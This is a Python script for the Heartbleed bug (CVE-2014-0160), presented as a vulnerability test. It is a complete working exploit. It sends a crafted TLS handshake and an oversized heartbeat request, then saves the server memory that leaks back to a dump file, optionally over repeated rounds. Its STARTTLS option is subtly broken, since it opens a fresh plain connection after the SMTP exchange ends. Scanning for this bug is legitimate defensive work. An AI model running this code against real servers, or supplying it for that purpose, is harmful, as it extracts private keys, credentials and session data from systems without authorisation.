#!/usr/bin/env python3

import sys
import struct
import socket
import time
import select
from optparse import OptionParser
import smtplib

options = OptionParser(usage='%prog server [options]',
description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')

options.add_option('-p','--port',type='int',default=443)
options.add_option('-n','--num',type='int',default=1)
options.add_option('-f','--file',type='str',default='dump.bin')
options.add_option('-q','--quiet',default=False,action='store_true')
options.add_option('-s','--starttls',action='store_true',default=False)

def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n',''))

hello = h2bin("""
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
00 0f 00 01 01
""")

hbv10 = h2bin("""
18 03 01 00 03
01 40 00
""")

hbv11 = h2bin("""
18 03 02 00 03
01 40 00
""")

hbv12 = h2bin("""
18 03 03 00 03
01 40 00
""")

def hexdump(data, dumpf, quiet):

    with open(dumpf,'ab') as dump:
        dump.write(data)

    if quiet:
        return

    for b in range(0,len(data),16):
        chunk = data[b:b+16]
        hexdata = ' '.join(f'{c:02X}' for c in chunk)
        printable = ''.join(chr(c) if 32<=c<=126 else '.' for c in chunk)
        print(f"  {b:04x}: {hexdata:<48} {printable}")
    print()

def recvall(sock,length,timeout=5):

    endtime = time.time()+timeout
    rdata = b''
    remain = length

    while remain>0:
        rtime = endtime-time.time()
        if rtime<0:
            return None if not rdata else rdata

        r,_,_ = select.select([sock],[],[],5)

        if sock in r:
            data = sock.recv(remain)
            if not data:
                return None

            rdata += data
            remain -= len(data)

    return rdata

def recvmsg(sock):

    hdr = recvall(sock,5)

    if hdr is None:
        print("Unexpected EOF receiving record header")
        return None,None,None

    typ,ver,ln = struct.unpack(">BHH",hdr)

    payload = recvall(sock,ln,10)

    if payload is None:
        print("Unexpected EOF receiving payload")
        return None,None,None

    print(f" ... received message: type={typ}, ver={ver:04x}, length={len(payload)}")

    return typ,ver,payload

def hit_hb(sock,dumpf,host,quiet):

    while True:

        typ,ver,pay = recvmsg(sock)

        if typ is None:
            print(f"No heartbeat response from {host}")
            return False

        if typ == 24:
            print("Received heartbeat response")
            hexdump(pay,dumpf,quiet)

            if len(pay)>3:
                print(f"WARNING: {host} is vulnerable!")
            else:
                print("No extra data returned")

            return True

        if typ == 21:
            print("Received alert")
            hexdump(pay,dumpf,quiet)
            print(f"{host} likely not vulnerable")
            return False

def connect(host,port,quiet):

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    if not quiet:
        print("Connecting...")

    sock.connect((host,port))

    return sock

def tls(sock,quiet):

    if not quiet:
        print("Sending Client Hello")

    sock.sendall(hello)

def parseresp(sock):

    while True:

        typ,ver,pay = recvmsg(sock)

        if typ is None:
            return 0

        if typ==22 and pay[0]==0x0E:
            return ver

def check(host,port,dumpf,quiet,starttls):

    response=False

    if starttls:
        s = smtplib.SMTP(host=host,port=port)
        s.ehlo()
        s.starttls()
        s.quit()

    sock = connect(host,port,quiet)

    tls(sock,quiet)

    version = parseresp(sock)

    if version==0:
        return False

    version = version-0x0300

    print(f"Server TLS version 1.{version}")

    print("Sending heartbeat request")

    if version==1:
        sock.sendall(hbv10)
    elif version==2:
        sock.sendall(hbv11)
    elif version==3:
        sock.sendall(hbv12)

    response = hit_hb(sock,dumpf,host,quiet)

    sock.close()

    return response

def main():

    opts,args = options.parse_args()

    if len(args)<1:
        options.print_help()
        return

    host=args[0]

    print(f"Scanning {host} on port {opts.port}")

    for _ in range(opts.num):
        check(host,opts.port,opts.file,opts.quiet,opts.starttls)

if __name__=="__main__":
    main()